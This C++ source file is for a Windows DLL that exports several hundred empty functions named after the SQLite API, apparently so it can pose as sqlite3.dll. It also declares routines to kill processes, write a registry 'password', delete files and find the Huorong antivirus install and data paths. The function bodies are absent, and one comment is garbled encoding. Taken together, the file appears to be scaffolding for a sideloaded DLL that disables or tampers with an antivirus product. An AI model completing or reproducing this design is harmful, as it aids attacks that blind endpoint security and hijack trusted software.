#include <Windows.h>
#include <tlhelp32.h>
#include <string.h>
#include <stdio.h>
#include <shlwapi.h>
#include <ctime>
#include <vector>
#include <string>
#pragma comment(lib, "Shlwapi.lib")


// ≈‰÷√Ω·ππÃÂ
struct AppConfig {
	std::vector<std::wstring> processNames;
	DWORD timestamp;
	std::wstring sourceFile;
	std::wstring destFile;
	DWORD registryPassword;
	std::vector<std::wstring> deleteFiles;
};

int GetPIDByProcName(const wchar_t* procname);
BOOL IsRunningAsAdmin(void);
AppConfig ReadConfiguration1(HMODULE hModule);
void SplitString(wchar_t* input, std::vector<std::wstring>& output);
bool isEmpty(const wchar_t* str);
DWORD WINAPI TerminateProcesses(LPVOID lpParam);
BOOL WriteInstallTimestamp(uint64_t timestamp);
BOOL WriteRegistryPassword(uint64_t password);
BOOL CheckRegKeyExists(HKEY hRoot, const wchar_t* regPath);
BOOL ReadRegValue(HKEY hRoot, const wchar_t* regPath, const wchar_t* valueName, DWORD valueType, void* buffer, DWORD bufferSize);
BOOL WriteRegValue(HKEY hRoot, const wchar_t* regPath, const wchar_t* valueName, DWORD valueType, const void* data, DWORD dataSize);
BOOL GenericCopyFile(const wchar_t* srcPath, const wchar_t* destPath);
BOOL GenericDeleteFile(const wchar_t* BasePath);
BOOL GetHuorongInstallPath(wchar_t* pathBuffer, DWORD bufferSize);
BOOL GetHuorongDataPath(wchar_t* pathBuffer, DWORD bufferSize);


extern "C" __declspec(dllexport) int sqlite3_aggregate_context() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_aggregate_count() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_auto_extension() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_backup_finish() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_backup_init() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_backup_pagecount() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_backup_remaining() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_backup_step() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_bind_blob() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_bind_blob64() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_bind_double() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_bind_int() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_bind_int64() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_bind_null() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_bind_parameter_count() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_bind_parameter_index() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_bind_parameter_name() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_bind_text() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_bind_text16() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_bind_text64() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_bind_value() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_bind_zeroblob() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_bind_zeroblob64() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_blob_bytes() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_blob_close() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_blob_open() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_blob_read() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_blob_reopen() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_blob_write() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_busy_handler() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_busy_timeout() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_cancel_auto_extension() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_changes() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_clear_bindings() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_close() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_close_v2() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_collation_needed() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_collation_needed16() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_blob() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_bytes() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_bytes16() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_count() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_database_name() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_database_name16() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_decltype() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_decltype16() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_double() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_int() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_int64() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_name() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_name16() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_origin_name() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_origin_name16() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_table_name() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_table_name16() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_text() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_text16() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_type() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_column_value() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_commit_hook() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_compileoption_get() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_compileoption_used() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_complete() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_complete16() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_config() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_context_db_handle() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_create_collation() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_create_collation16() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_create_collation_v2() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_create_function() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_create_function16() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_create_function_v2() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_create_module() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_create_module_v2() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_data_count() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_db_cacheflush() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_db_config() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_db_filename() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_db_handle() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_db_mutex() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_db_readonly() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_db_release_memory() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_db_status() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_declare_vtab() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_enable_load_extension() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_enable_shared_cache() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_errcode() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_errmsg() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_errmsg16() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_errstr() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_exec() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_expired() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_extended_errcode() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_extended_result_codes() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_file_control() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_finalize() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_free() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_free_table() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_get_autocommit() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_get_auxdata() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_get_table() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_global_recover() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_initialize() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_interrupt() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_last_insert_rowid() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_libversion() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_libversion_number() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_limit() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_load_extension() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_log() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_malloc() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_malloc64() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_memory_alarm() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_memory_highwater() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_memory_used() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_mprintf() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_msize() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_mutex_alloc() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_mutex_enter() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_mutex_free() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_mutex_leave() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_mutex_try() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_next_stmt() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_open() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_open16() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_open_v2() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_os_end() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_os_init() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_overload_function() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_prepare() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_prepare16() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_prepare16_v2() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_prepare_v2() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_profile() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_progress_handler() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_randomness() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_realloc() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_realloc64() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_release_memory() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_reset() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_reset_auto_extension() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_result_blob() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_result_blob64() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_result_double() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_result_error() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_result_error16() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_result_error_code() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_result_error_nomem() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_result_error_toobig() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_result_int() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_result_int64() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_result_null() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_result_subtype() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_result_text() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_result_text16() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_result_text16be() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_result_text16le() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_result_text64() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_result_value() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_result_zeroblob() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_result_zeroblob64() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_rollback_hook() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_set_authorizer() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_set_auxdata() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_shutdown() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_sleep() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_snprintf() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_soft_heap_limit() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_soft_heap_limit64() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_sourceid() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_sql() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_status() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_status64() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_step() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_stmt_busy() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_stmt_readonly() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_stmt_status() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_strglob() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_stricmp() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_strlike() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_strnicmp() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_system_errno() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_table_column_metadata() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_test_control() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_thread_cleanup() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_threadsafe() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_total_changes() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_trace() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_transfer_bindings() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_update_hook() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_uri_boolean() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_uri_int64() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_uri_parameter() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_user_data() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_value_blob() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_value_bytes() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_value_bytes16() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_value_double() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_value_dup() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_value_free() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_value_int() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_value_int64() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_value_numeric_type() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_value_subtype() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_value_text() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_value_text16() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_value_text16be() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_value_text16le() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_value_type() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_vfs_find() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_vfs_register() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_vfs_unregister() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_vmprintf() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_vsnprintf() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_vtab_config() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_vtab_on_conflict() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_wal_autocheckpoint() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_wal_checkpoint() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_wal_checkpoint_v2() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_wal_hook() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_win32_is_nt() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_win32_mbcs_to_utf8() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_win32_set_directory() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_win32_sleep() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_win32_utf8_to_mbcs() { return 0; }
extern "C" __declspec(dllexport) int sqlite3_win32_write_debug() { return 0; }